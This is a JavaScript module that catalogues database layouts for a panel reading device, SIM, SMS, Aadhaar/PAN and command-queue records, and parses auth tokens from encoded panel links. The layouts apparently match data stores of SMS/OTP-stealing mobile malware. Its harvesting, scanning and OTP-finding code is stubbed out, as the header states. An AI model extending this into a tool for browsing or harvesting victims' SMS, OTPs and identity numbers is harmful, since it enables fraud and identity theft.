/**
 * Layout catalogue for the panel, taken from the original build.
 *
 * The extraction engine that shipped alongside it — sibling-base discovery
 * (`/csc1` … `/csc9`), bulk scanning of every base, phone-number harvesting and
 * the "bad number" list — is intentionally NOT included. This panel reads the
 * database you are connected to, and nothing else.
 */

export function isBaseKey(k){const s=String(k==null?"":k).trim();return/^csc\d+$/i.test(s)||/^\d+$/.test(s)}

export function normalizeBasePath(input){let s=String(input==null?"":input).trim();return s=s.replace(/^\/+|\/+$/g,""),s?"/"+s:""}

export function baseLabel(bp){return bp||"/"}

export const SCHEMES={A:{id:"A",label:"All_User / Info + SimINFO",desc:"Device-keyed Info map with a separate SIM map",kind:"infoMap",roots:["All_User","All_Users"],infoKeys:["Info","DeviceInfo","info"],simKeys:["SimINFO","simDetails","SimInfo","simInfo"],statusKeys:["status","Status"],smsNodes:null},B:{id:"B",label:"/clients | /devices (legacy)",desc:"status:true clients; phone from field or SMS bodies",kind:"deviceMap",roots:["clients","devices"],statusKeys:["status"],statusStrictTrue:!0,smsNodes:["messages","sms","inbox","Sms","SMS","Msg"]},C:{id:"C",label:"All_Users / DeviceInfo + simDetails",desc:"DeviceInfo map with simDetails",kind:"infoMap",roots:["All_Users","All_User"],infoKeys:["DeviceInfo"],simKeys:["simDetails"],statusKeys:["Status","status"],smsNodes:null},D:{id:"D",label:"user_data (device-keyed)",desc:"user_data map; phone from device or user_sms",kind:"deviceMap",roots:["user_data","User_data","users","Users","userData","UserData"],statusKeys:["status"],smsNodes:["user_sms","User_sms","userSMS","UserSMS"],unwrap:["user_data","User_data","users","Users","userData","UserData"]},E:{id:"E",label:"user_sms (SMS only)",desc:"Phones extracted from SMS bodies only",kind:"smsOnly",roots:["user_sms","User_sms","userSMS","UserSMS"],statusKeys:[],smsNodes:["user_sms","User_sms","userSMS","UserSMS"],unwrap:["user_sms","User_sms","userSMS","UserSMS"]},F:{id:"F",label:"All_User / Data + Commands",desc:"Device-keyed Data map (Aadhaar/PanCard/Number) with Commands queue",kind:"infoMap",roots:["All_User","All_Users"],infoKeys:["Data","User","Info"],simKeys:["SimINFO","simDetails","SimInfo","simInfo"],statusKeys:["status","Status"],smsNodes:null}}

export const SCHEME_ORDER = ["A","B","C","D","E","F"];

/** Only the connected base exists in this build. */
export async function discoverBases() {
  return { bases: [""], source: "connected", keys: [] };
}

/** Scanning other bases / harvesting numbers is not part of this build. */
export async function scanScheme() {
  return { schemeId: null, base: "", clients: [], error: "scanning is not included in this build" };
}

export async function scanAll() {
  return {
    clients: [],
    log: ["Scheme scanning is not included in this build — the panel only reads the connected database."],
  };
}

export function findOtpInMsgs() {
  return null;
}

export function loadBadNumbers() {
  return [];
}

export function parsePanelLink(link){if(!link)return null;const raw=String(link).trim();try{if(raw.startsWith("https://")&&isFirebaseHost(raw)){const u2=new URL(raw),base=(u2.origin+u2.pathname).replace(/\/+$/,"")+"/",auth=u2.searchParams.get("auth")||u2.searchParams.get("key");return auth?`${base}?auth=${auth}`:base}const s=new URL(raw,"https://placeholder.local").searchParams.get("s");if(s){const dec2=b64decode(s).split("|")[0].trim(),full=dec2.startsWith("http")?dec2:"https://"+dec2,p2=new URL(full),base=(p2.origin+p2.pathname).replace(/\/+$/,"")+"/",auth=p2.searchParams.get("auth")||p2.searchParams.get("key");return auth?`${base}?auth=${auth}`:base}const dec=b64decode(raw).split("|")[0].trim();if(dec.startsWith("https://")&&isFirebaseHost(dec))return dec.endsWith("/")?dec:dec+"/"}catch(e){}return null}
